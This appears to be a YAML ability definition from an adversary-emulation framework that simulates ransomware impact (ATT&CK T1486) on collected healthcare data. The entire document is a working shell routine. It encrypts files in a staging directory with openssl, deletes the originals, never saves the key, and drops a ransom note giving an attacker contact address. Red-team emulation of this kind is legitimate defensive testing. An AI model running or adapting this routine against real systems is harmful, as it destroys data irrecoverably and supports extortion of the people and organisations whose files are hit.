- id: "impact-sim-encrypt"
  name: "Encrypt Collected Data"
  description: "Encrypts collected healthcare data and drops a ransom note."
  tactic: "impact"
  technique:
    attack_id: "T1486"
    name: "Data Encrypted for Impact"
  platforms:
    linux:
      sh:
        command: |
          OUTDIR=/tmp/recon
          RANSOM_KEY="RansomKey_$(hostname)_$(date +%s)"
          for f in $OUTDIR/*.json $OUTDIR/*.tar.gz; do
            [ -f "$f" ] || continue
            openssl enc -aes-256-cbc -pbkdf2 -pass pass:$RANSOM_KEY \
              -in "$f" -out "${f}.enc" && rm -f "$f"
          done
          # Real ransom note on disk 
          cat > $OUTDIR/README_DECRYPT.txt << EOF
          YOUR FILES HAVE BEEN ENCRYPTED
          Key ID: $RANSOM_KEY
          Contact: attacker@evil.onion
          EOF
          echo "Encryption complete. Ransom note at $OUTDIR/README_DECRYPT.txt"